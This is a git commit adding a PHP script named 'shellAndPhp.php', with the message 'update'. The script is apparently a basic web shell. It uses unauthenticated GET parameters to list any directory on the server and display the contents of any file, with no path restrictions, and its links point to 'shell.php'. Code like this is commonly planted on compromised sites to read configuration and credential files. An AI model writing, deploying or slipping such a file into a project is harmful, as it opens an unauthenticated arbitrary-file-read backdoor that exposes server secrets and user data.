635e865d089fde435989b5ae115c018a60804022
LuizFernandoDeveloper <luiz.fernando.developer@outlook.com>
2022-09-28 16:42:03 -0300

    update

---
+++ shellAndPhp.php
@@ -0,0 +1,58 @@
+<?php
+$path = $_GET['v'];
+$action = $_GET['a'];
+
+echo "Servidor <br>";
+
+if($action == true){
+
+echo "<textarea class='form-control' name='textl'>";
+
+$arquivo_edit = fopen ($action, 'r') or die("Unable to open file!");
+
+while( !feof($arquivo_edit)){
+$linha = fgets($arquivo_edit);
+echo htmlspecialchars($linha);
+
+}
+
+fclose($arquivo_edit);
+
+
+echo "</textarea>";
+
+
+
+}else{
+
+
+
+
+if($path == false){
+$path = "./";
+}else{
+$path = $path;
+}
+
+$diretorio = dir($path);
+
+
+while($arquivo = $diretorio -> read()){
+
+$arquivoex = substr($arquivo, strripos($arquivo, '.'));
+
+if($arquivoex == ".php" or $arquivoex == ".js" or $arquivoex == ".css" or $arquivoex == ".txt"){
+$mostrar = "<a href='shell.php?a=$path$arquivo'>".$arquivo."</a><br>";
+}else{
+$mostrar = "<a href='shell.php?v=$path$arquivo/'>".$arquivo."</a><br>";
+}
+
+echo $mostrar;
+
+}
+$diretorio -> close();
+}
+
+
+
+?>
